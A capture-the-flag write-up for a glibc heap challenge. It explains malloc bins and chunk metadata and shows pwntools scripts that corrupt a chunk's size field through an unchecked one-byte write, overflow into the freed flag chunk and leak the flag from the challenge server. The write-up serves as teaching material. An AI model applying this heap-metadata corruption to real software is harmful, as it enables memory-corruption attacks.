Here's my writeup for simple-heap-v1. It's a nice heap challenge, though I wouldn't necessarily call it "simple". With this writeup, I'll try to walk you through my thought process, and explain the intermediate steps I took,
rather than jumping straight to a working exploit. I went down the wrong path a little bit during this challenge, and I want the writeup to reflect that process.


# The Challenge

The challenge provided me with a binary and a Dockerfile. Popping the binary into ghidra gives us the following main function (with some variables renamed so it's more clear what's going on):

```C
void main(void)

{
  int c;
  long in_FS_OFFSET;
  int index;
  undefined8 chunk1;
  void *chunk2;
  undefined8 chunk3;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Welcome to the flag checker");
  chunk1 = getchunk();
  puts("I\'ll give you three chances to guess my flag.");
  chunk2 = (void *)getchunk();
  check(chunk2);
  puts("I\'ll also let you change one character");
  printf("index: ");
  __isoc99_scanf(&DAT_001020d7,&index);
  getchar();
  printf("new character: ");
  c = getchar();
  getchar();
  *(char *)((long)index + (long)chunk2) = (char)c;
  check(chunk2);
  free(chunk2);
  puts("Last chance to guess my flag");
  chunk3 = getchunk();
  check(chunk3);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

Let's look at the `getchunk` and `check` functions as well.

```C

void * getchunk(void)

{
  long in_FS_OFFSET;
  size_t size;
  void *allocated;
  void *ret_val;
  ssize_t local_18;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  printf("size: ");
  __isoc99_scanf(&DAT_0010200f,&size);
  getchar();
  printf("data: ");
  allocated = malloc(size);
  ret_val = allocated;
  for (; size != 0; size = size - local_18) {
    local_18 = read(0,allocated,size);
    allocated = (void *)((long)allocated + local_18);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return ret_val;
}

void check(char *candidate_chunk)

{
  int iVar1;
  char *flag_chunk;
  
  flag_chunk = (char *)malloc(128);
  iVar1 = open("flag.txt",0);
  if (iVar1 < 0) {
    errx(1,"failed to open flag.txt");
  }
  read(iVar1,flag_chunk,128);
  close(iVar1);
  iVar1 = strcmp(candidate_chunk,flag_chunk);
  if (iVar1 == 0) {
    puts("Correct!");
                    /* WARNING: Subroutine does not return */
    exit(7);
  }
  printf("%s is not the flag.\n",candidate_chunk);
  free(flag_chunk);
  return;
}

```


So it looks like `getchunk` asks the user for the size of some data, and then reads that many chars of input from the user.
There isn't any buffer overflow we can exploit, since the read function reads exactly as many bytes as are malloc'd.

The `check` function simply just opens the flag, mallocs some memory for it, reads the flag into memory, compares it with the given flag, then frees the memory containing the flag chunk.

The main function calls getchunk, then getchunk again, checks the second chunk, allows us to change one character, then gives us a final chance with a new guess.
The critical thing to notice here is that the character change index is not bounds-checked, so we can write to somewhere else on the heap.


# What can we do?
From the title of the challenge, it's clear that there's some kind of heap exploit that we need to use here.
There's no use-after-free going on, but the one write we have should allow us to get up to some shenanigans.

But first, for those who are unfamiliar with how the heap works, I'll give a brief overview - just enough to understand what this challenge does.

# How heap allocation works 
This is my working understanding of how `malloc` and `free` work with glibc. This is by no means a definitive guide, and there may be some small inaccuracies or caveats that I miss, so take this with a grain of salt.

## malloc & free: the basic picture

Let's start off with the first call to `getchunk` in the code. 

```
chunk1 = getchunk()
```

Here, `chunk1` will point to somewhere on the heap, since we're returning the pointer malloc gave us.


```

+----------------+ <----- chunk1
| DATA READ FROM |
|      USER      |
+----------------+


```


Then `chunk2` is allocated in the same fashion.


```

+----------------+ <----- chunk1
| DATA READ FROM |
|      USER      |
+----------------+

...

+----------------+ <----- chunk2
| DATA READ FROM |
|      USER      |
+----------------+

```

Cool. Then we check the flag. The `check` function makes its own call to `malloc`, this time asking for 128 bytes.


```
+----------------+ <----- chunk1
| DATA READ FROM |
|      USER      |
+----------------+

...

+----------------+ <----- chunk2
| DATA READ FROM |
|      USER      |
+----------------+

...

+----------------+ <----- flag_chunk
|      FLAG      |
|                |
+----------------+

```

The comparison is made, and unless you've already solved the challenge (or you're really good at guessing), the flag chunk is freed.

### What happens when you free memory?

When you free memory, you're telling the OS and libc that you're done with the memory, and that it can be used for other purposes. Of course, that memory is still there. And you'll probably want some more memory back
later. Rather than doing the lengthy process of telling the OS you're done with the memory, then immediately asking for more later, glibc is helpful and just keeps the memory around (at least for small enough chunks of memory).

When you free a chunk of memory that's small, a pointer to that chunk is stored in the corresponding linked list (called a "bin") for chunks of that size. 
Note that chunks will always be of size that's a multiple of 8 bytes, starting with 16,
so there are bins for chunks of sizes 16,24,32,...,120,128,... (there's actually two different types of bins we're concerned about here, the fastbins and small bins, but that detail isn't important for this writeup)

Later, when we call `malloc` again, if we're asking for some size which has a chunk in the corresponding bin, we get a pointer to that chunk. This saves a lot of time.
Generally (ie. for the purpose of this challenge), bins have a last in, first out structure, meaning that if we free chunk A then chunk B, we'll get chunk B in the next malloc for the same size, then chunk A afterwards.

So now our heap looks something like this:


```
+----------------+ <----- chunk1
| DATA READ FROM |
|      USER      |
+----------------+

...

+----------------+ <----- chunk2                                        128-byte bin: [flag_chunk] 
| DATA READ FROM |
|      USER      |
+----------------+

...

+----------------+ <----- flag_chunk (freed)
|  FLAG (FREED)  |
|                |
+----------------+

```


Let's fast-forward to the next memory-related call in the challenge. We'll come back to the 1-character change later once we have a strong understanding of what happens.


```
free(chunk2)
```

Now the pointer to `chunk2` is freed, and is thus added to the bin of the corresponding size. Let's say we made chunk2 64 bytes for now.

```
+----------------+ <----- chunk1
| DATA READ FROM |
|      USER      |
+----------------+

...

+----------------+ <----- chunk2 (freed)                                128-byte bin: [flag_chunk] 
| DATA READ FROM |
|  USER (FREED)  |                                                      64-byte bin: [chunk2]
+----------------+

...

+----------------+ <----- flag_chunk (freed)
|  FLAG (FREED)  |
|                |
+----------------+

```

Now, we have another call to `getchunk`. Since we can control the size, if we tell the program to ask for a chunk of size 128, we'll get the pointer to flag_chunk back! Since the data from the flag is still there (since the chunk
was waiting to be reused), we might have a pointer to the flag!

Unfortunately, if we ask for a chunk of size 128, we're then forced to write 128 bytes of our own data, thus overwriting any chance of us finding the flag. The best we can do is ask for a chunk of size 121. Since chunk sizes for
malloc are rounded up to the nearest multiple of 8, we'll at best be able to recover the last 7 bytes of the flag using this approach.

Let's try it out anyways:
```
> python -c "print('flag'*32)" > flag.txt
> ./chal
Welcome to the flag checker
size: 1
data: A
I'll give you three chances to guess my flag.
size: 1
data: A
A is not the flag.
I'll also let you change one character
index: 0
new character: B
B is not the flag.
Last chance to guess my flag
size: 121
data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlagflag is not the flag.
>
```

Of course, this only works because our test flag is 128 bytes long anyways, which happens not to be the case for the real flag.

# One potential pathway

We still have a lot to work with though. For one, we're not even using the fact that we have that 1-byte write to somewhere on the heap. Plus, there's a few facts about the heap that we haven't used yet.

## Repainting the picture of the heap.

When you allocate memory for the heap, it's probably going to be pretty close to the other memory on the heap, in order to keep the heap small. In fact, at least for this challenge, all the data is actually very close
together! Instead of the heap looking like this:

```
+---------+
| CHUNK 1 |
+---------+



(empty memory)



+---------+
| CHUNK 2 |
+---------+
...
```

It looks something like this:

```
+----------+
| METADATA |
+----------+ <--- chunk1
| CHUNK 1  |
+----------+ 
| METADATA |
+----------+ <--- chunk2
| CHUNK 2  |
+----------+
| METADATA |
+----------+ <--- flag_chunk
| FLAG     |
+----------+

...
```

The chunks are practically right next to each other, with only a little bit of metadata in between! The metadata that we care about here is the size of the proceeding chunk, which is important because we know that `free`
bins chunks based on their size. If we can modify heap metadata, we might be able to make the first approach work! How? If we tell glibc that the `flag_chunk` chunk is smaller than it is (ie. only 16 bytes),
then when `getchunk` is called later, we can ask for a chunk of 1 byte size, get back a pointer to where the flag was stored, despite it being a pointer to a chunk that's actually 128 bytes! From here,
we only have to overwrite 1 byte, rather than 121! Great!

## Modifying heap metadata
So where is the size of the chunk stored within the metadata? It turns out to be 8 bytes before the start of the actual data. The only thing is that the lowest 3 bits of this byte are actually used for other purposes (since
chunks are always sizes that are multiples of 8, those 3 bits would always be zero if we were storing just the chunk size). In our case, those bits are set to be 001. The size of the metadata also seems to be stored there, which is 
16 bytes. So really the number we want to write is the size of the chunk+17.

So let's look at the map of our heap when we have that 1-byte write:

```
+----------+
| METADATA |
+----------+ <--- chunk1
| CHUNK 1  |
+----------+ 
| METADATA |
+----------+ <--- chunk2                128-byte bin: [flag_chunk]
| CHUNK 2  |
+----------+
| METADATA |
+----------+ <--- flag_chunk (freed)
| FLAG     |
+----------+

...
```

Let's also take a look at just the memory-related lines in source code:

```
chunk1 = getchunk();
chunk2 = getchunk();
flag_chunk = malloc(128);
free(flag_chunk);
/* ARBITRARY WRITE */
flag_chunk = malloc(128);
free(flag_chunk)
free(chunk2)
chunk3 = getchunk();
flag_chunk = malloc(128);
free(flag_chunk);
```

Our aim is to make chunk3 be the same pointer as flag_chunk, and that when we ask for chunk3 we only need to overwrite 1 byte. So let's overwrite the size metadata of the free flag_chunk to make it say that it's 16 bytes in size.

When check is called for the first time, the pointer for flag_chunk is returned because it's in the 128-byte bin. However, when the pointer is freed, it's put in the 16-byte bin.

When we call getchunk() and pass in size 1, we should get a pointer to the recently-freed flag_chunk in the 16-byte bin!

Let's try it out with a quick pwntools script:

```python
from pwn import *

io = process("./chal")


io.sendlineafter(b"size:", b'8')
io.sendlineafter(b"data:", b'A'*8)

io.sendlineafter(b"size:", b'64')
io.sendlineafter(b"data:", b'A'*64)

io.sendlineafter(b"index:", b'72')
io.sendlineafter(b"character:", b'\x21') # new size is now 16 + 17

io.sendlineafter(b"size:", b'1')
io.sendlineafter(b"data", b'I')

io.interactive()
```

When we run it, we get:
```
I\xbb\x83\\x05is not the flag.
```

Wait, what?

## Why didn't this work?

When I did this challenge, I really thought this would work. After some searching however, I realized the mistake: I overlooked an important part of the `free` function. You see, when you free memory, you tell the libc that it's
free for reuse. And indeed, glibc does reuse it pretty much immediately. The freed chunk is repurposed to store more metadata about the chunk, such as a pointer to the next element in the bin it's in. This metadata takes up 16
bytes. That means after the flag_chunk is freed, the first 16 bytes of the flag are overwritten pretty much immediately.

If we modify our script to ask for a chunk of size 16 rather than 1, we can get the remainder of the flag:

```
...
io.sendlineafter(b"size:", b'16') 
io.sendlineafter(b"data", b'I'*16)

io.interactive()
```

Output:

```
IIIIIIIIIIIIIIIIflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag is not the flag.
```

That's a lot better than the 121 bytes from earlier. Unfortunately, it's still not enough to guess the flag (at least for me - you might be built different. In that case, the partial flag from running the script on remote is: 
`IIIIIIIIIIIIIIIIu_c0uld_unm4p_th3_libc}`. Just remember the flag is in non-standard format for this challenge!)



# The solution:
We're really close. We have just 16 bytes to go. But we need to find a way to read from flag_chunk *before the memory is freed*. Let's turn our attention to our heap map again, moving along the code even further.

After `free(chunk2)`, we have:

```
+----------+
| METADATA |
+----------+ <--- chunk1
| CHUNK 1  |
+----------+ 
| METADATA |                                    
+----------+ <--- chunk2 (freed)                (size of chunk2)-byte bin: [chunk2]
| CHUNK 2  | (contains 16 bytes of metadata)                 128-byte bin: [flag_chunk]
+----------+
| METADATA |
+----------+ <--- flag_chunk (freed)
| FLAG     | (contains 16 bytes of metadata)
+----------+
```

Next, `chunk3 = getchunk()` is called. If chunk2 was of size 128, then we get it back as chunk3.

Here, we can utilize that arbitrary write we had. What if we told `free` that chunk2 was of size 128, when it was really smaller (eg. 64 bytes)? In that case, we can write more bytes into memory than the chunk has space for!
Why will this help us? We can use our overflowing write to make the heap look something like this:

```
+----------+
| METADATA |
+----------+ <--- chunk1
| CHUNK 1  |
+----------+ 
| METADATA |                                    
+----------+ <--- chunk2 (freed) 
| CHUNK 3A |                                                 
+-AAAAAAAA-+
| AAAAAAAA |
+----------+ <--- flag_chunk 
| FLAG     | 
+----------+
```

That way, when printf is called on chunk3, it'll keep reading bytes until it reaches a null terminator. If we've overwritten enough bytes to reach the next chunk, we can read the flag! We don't even need to worry about
overwriting the flag, since it's read into memory after the overflow.


To summarize, we're tricking getchunk into giving us a chunk that it thinks has room for 128 bytes, but it really only has space for 64. We're using this overflow to read into the next chunk in the heap, which happens to contain
the flag. To trick getchunk, we're overwriting the chunk metadata of chunk2 to say it has size 128 using the one-byte write we're given. Let's put it into a working exploit:

```python
from pwn import *

io = remote("amt.rs", 31176)

io.sendlineafter(b"size:", b'8')
io.sendlineafter(b"data:", b'A'*8)




io.sendlineafter(b"size:", b'64')
io.sendlineafter(b"data:", b'A'*64)


io.sendlineafter(b"index:", b'-8') # offset of the chunk2 size metadata
io.sendlineafter(b"character:", b'\x91') # 128 + 17

io.sendlineafter(b"size:", b'128')
io.sendlineafter(b"data", b'I'*128)

io.interactive()

```

And...

```
IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIflag{wh0_kn3w_y0u_c0uld_unm4p_th3_libc}IIIIIIIII is not the flag.
free(): invalid size
```

There we go! I have no idea what the unmapping the libc is about, but we've done it!


`flag{wh0_kn3w_y0u_c0uld_unm4p_th3_libc}`

